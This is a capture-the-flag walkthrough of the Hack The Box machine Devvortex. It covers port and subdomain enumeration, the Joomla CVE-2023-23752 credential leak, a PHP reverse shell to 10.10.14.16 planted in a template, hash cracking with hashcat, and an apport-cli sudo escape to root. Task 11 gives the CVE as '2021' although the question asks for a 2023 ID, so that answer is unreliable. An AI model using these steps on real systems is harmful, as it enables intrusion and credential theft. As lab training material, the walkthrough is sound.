# Devvortex

*Linux* - Feaatures Joomla CMS vulnerable to information disclosure. Service's configuration files reveal plaintext credentials to Administrative access. Them template is modified to include malicious PHP code and gain a shell. 

After enumerating the db content, hashed credentials are obtained, which are cracked and then you can SSH to machine.

Post-exploitation enumeration reveals that the user is allowed to run `approt-cli` as root, which is leveraged to obtain a root shell.

----------
## Task 1

How many open TCP ports are listening on Devvortex?
## Solution 1

We see two open ports after the `nmap` scan.

```sh
nmap -sV -sC -T4 10.10.11.242
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-20 16:53 CET
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

--------------
## Task 2

What subdomain is configured on the target's web server?

## Solution 2

First let's add the ip address and `devvortex.htb` to the `/etc/hosts`.

```sh
echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
```

I will use `ffuf` for this task and a wordlist from `seclists` to perform the enumeration.

```sh
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb'
```

I see a lot of results with the size of 154, so let's filter them out.

```sh
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 65ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1265 req/sec :: Duration: [0:00:16] :: Errors: 0 ::

```

So the answer is `dev.devvortex.htb`.

----------------------
## Task 3

What Content Management System (CMS) is running on dev.devvortex.htb?

## Solution 3

Let's add the new subdomain to the `/etc/hosts`.

```sh
echo "10.10.11.242 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

Then open `http://dev.devvortex.htb` on the browser.

There is no information about the CMS on the home-page, so let's look at `/robots.txt` as it often contains such information.

And when visiting `http://dev.devvortex.htb/robots.txt` we see that it shows that the CMS used on the page is `Joomla`.

```sh
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

------------
## Task 4

Which version of Joomla is running on the target system?

## Solution 4

From all the information until now, we can't see the Joomla version, but on the `robots.txt` we have a list of directories, which the site doesn't want the search engines to go, so maybe they can be of importance.

The `/administrator` has a login panel, which doesn't disclose the version number.

Let's check the `manifest` file which usually is located at `administrator/manifests/files/joomla.xml`. And it works, now we have the version number.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<extension type="file" method="upgrade">
	<name>files_joomla</name>
	<author>Joomla! Project</author>
	<authorEmail>admin@joomla.org</authorEmail>
	<authorUrl>www.joomla.org</authorUrl>
	<copyright>(C) 2019 Open Source Matters, Inc.</copyright>
	<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
	<version>4.2.6</version>
	<creationDate>2022-12</creationDate>
	<description>FILES_JOOMLA_XML_DESCRIPTION</description>
	...
```

----------
## Task 5

What is the 2023 CVE ID for an information disclosure vulnerability in the version of Joomla running on DevVortex?

## Solution 5

Now let's just search for this version of Joomla for any vulnerabilities.

And this yields a result of `CVE-2023-23752` which is an improper access check that allows unauthorized access to web-service endpoints.

-----------
## Task 6

What is the lewis user's password for the CMS?

## Solution 6

Let's use the vulnerability.

By going to `http://dev.devvortex.htb/api/index.php/v1/config/application?public=true` and this shows a `json` file which has in the plain-text the username `lewis` and the password `P4ntherg0t1n5r3c0n##`.

```json
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```

-----------
## Task 7

What table in the database contains hashed credentials for the logan user?

## Solution 7

Let's try to login with the credentials that we have now.

There we have administrator privileges and we can edit templates on `System` - `Administrator Template`. There is a template `Atum - Details and Files`.

Let's edit the `error.php` and add there a reverse shell.

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'");
?>
```

Start a listener on the same port.

```sh
nc -nlvp 4444
```

Now visit the page at `http://dev.devvortex.htb/administrator/templates/atum/error.php` and now we have a shell.

```sh
whoami
www-data
```

From the solution of the `Task 6` we know that there exists a mysql server, so let's try to login with the `lewis` credentials.

Now it doesn't work, but let's upgrade our shell and create a new PTY using bash.

```sh
script /dev/null -c bash
```

And now we can login as `lewis` to the `mysql`.

Let's see databases:

```mysql
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)
```

```mysql
mysql> use joomla;
use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)
```

Then by executing `select * from sd4fg_users;` we see users and the hashed passwords, such as:

```mysql
lewis - lewis@devvortex.htb - $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u

logan paul - logan@devvortex.htb - $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

## Task 8

Logan's password hash is `$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`.

Let's use `hashcat` and try to crack it.

```sh
echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > logan_password
```

```sh
hashcat logan_password

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

So it has found 4 hash-modes that are matching the structure, and let's use the `3200`.

```sh
hashcat -m 3200 logan_password --wordlist /home/hb/Documents/tools/rockyou.txt
```

And it has cracked the password:

```sh
...
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
...
```

The password is `tequieromucho`.

-----------

## Task 9

Submit the flag located in the logan user's home directory.

## Solution 9

Let's try to `ssh` with `logan` and the newly found password `tequieromucho`.

On the `/home/logan` there is the `user.txt` file which contains the flag `44f9f67596d2ba27c0b87ae60b61ba21`.

-------------

## Task 10

What is the full path to the binary that the lewis user can run with root privileges using `sudo`?

## Solution 10

Now let's see if we have sudo permissions:

```sh
sudo -l

Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

And here we see also the location which is `/usr/bin/apport-cli`.

-----------

## Task 11

What is the 2023 CVE ID of the privilege escalation vulnerability in the installed version of apport-cli?

## Solution 11

Let's check the version.

```sh
logan@devvortex:~$ sudo /usr/bin/apport-cli --version
2.20.11
```

Now search on google for any exploit for this version.

There is a vulnerability with the CVE `CVE-2021-1326`.

--------

## Task 12

Submit the flag located in the root user's home directory.

## Solution 12

Now we will use the exploit found.

A PoC for this vulnerability is:

```sh
sudo /usr/bin/apport-cli -c /var/crash/some_crash_file.crash
press V (view report)
!/bin/bash
```

First we need to create a report, that will be read from the `apport-cli` which is a tool for collecting data from crashed processes.

```sh
apport-cli -f
```

Then just choose some options for a random imaginary problem.

In the end choose to view the report, and put `!/bin/bash`.

Now, you have`root` access.

```sh
root@devvortex:/home/logan# cd /root
root@devvortex:~# ls
root.txt
root@devvortex:~# cat root.txt
2faacbc9dc44b16f8a93131cd663db1b
```

